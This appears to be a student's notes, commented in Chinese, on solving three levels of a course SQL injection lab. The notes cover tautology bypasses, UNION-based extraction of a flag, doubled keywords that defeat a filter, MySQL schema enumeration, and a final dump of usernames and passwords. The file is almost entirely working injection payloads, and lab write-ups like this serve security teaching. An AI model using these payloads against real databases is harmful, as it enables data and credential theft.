https://sqli.comp6841.xyz/


LEVEL 1
' or '1' = '1                                   《==

LEVEL 2
' or TRUE --                                    《==
' UNION SELECT flag FROM my_secret_table; --    《==

LEVEL 3
/* 先通过重复他的查询来判断我有没有成功突破他的关键词替换 */
' UUNIONNION SSELECTELECT * FFROMROM search_engine; -- -'

/* 接下来我想找到其他table的名字 结果他用的不是SQLite 而是MySQL 下面的语法是SQLite的 “sqlite_master” 我用这个各种尝试了一个多小时都失败 */
' UUNIONNION SSELECTELECT * FFROMROM sqlite_master WWHEREHERE type = "table"; -- -'

/* 甚至还尝试了搭配不同的名字还是失败。至少这步我发现了UNION必须要和目标表的表格数一样才行 名字可以无所谓 但是必须对应上 */
' UUNIONNION ALL SSELECTELECT type AS title, tbl_name AS description, name AS link FFROMROM sqlite_master; -- -'

/* 这里我终于发现了他是MySQL 然后换了一下系统关键词就出来了 “information_schema. TABLES” */
' UUNIONNION SSELECTELECT table_schema, TABLE_NAME, TABLE_TYPE  FFROMROM information_schema. TABLES; -- -'

/* 上一步一下子出现了66个结果 我们要的信息在最后 所以优化了这一步 直接过滤出BASE TABLE  然后我们就知道了数据库里还有另外一个table叫users */
' UUNIONNION SSELECTELECT table_schema, TABLE_NAME, TABLE_TYPE  FFROMROM information_schema. TABLES WWHEREHERE TABLE_TYPE = 'BASE TABLE'; -- -'

/* 有了目标表名还不行 我们还需要要把目标表的字段名拿出来 这一步就得到了 username, password 这两个字段名 */
' UUNIONNION SSELECTELECT group_concat(COLUMN_NAME), ' ', ' ' FFROMROM information_schema. COLUMNS WWHEREHERE  table_name = 'users'; -- -'

/* 最后的最后 其实查询答案就这么简单 谁一开始能想到就是这么简单的 select username, password from users; 哎 太折腾了 */
' UUNIONNION SSELECTELECT username, password, ' ' FFROMROM users; -- -

